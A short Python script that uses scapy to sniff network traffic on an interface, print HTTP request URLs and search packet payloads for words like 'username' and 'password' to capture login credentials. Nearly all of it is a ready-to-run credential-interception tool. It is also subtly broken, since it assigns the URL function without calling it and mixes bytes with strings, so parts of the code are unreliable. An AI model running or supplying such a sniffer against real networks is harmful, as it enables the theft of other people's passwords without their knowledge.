#!/usr/bin/env python

#Install : pip install scapy_http
from scapy.layers import http
import scapy.all as scapy
import optparse

# def get_arguments():
#     parser = optparse.OptionParser()
#     parser.add_option("-t","--target", dest="target",help="Exact/Range of target IP addresses.")
    
#     (options,arguments) = parser.parse_args()
#     if not options.target:
#         parser.error("Please provide target IP address/range(1/24).")
#     return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)  #, filter="port 80") # You can use: port 80 (for webservers), udp (used for videos), tcp, arp, port 21 (for ftp)
    
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
           load = packet[scapy.Raw].load
           keywords = ["username", "user", "uname", "password", "pass", "pwd"]
           for keyword in keywords:
                if keyword in load:
                    return load
                    # print("\n\n[+] Possible uname/pass > " + load + "\n\n")
                    # break

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url
        print("[+] HTTP Request >> " + url)
        
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible uname/pass > " + login_info + "\n\n")
    
interface = "eth0"
sniff(interface)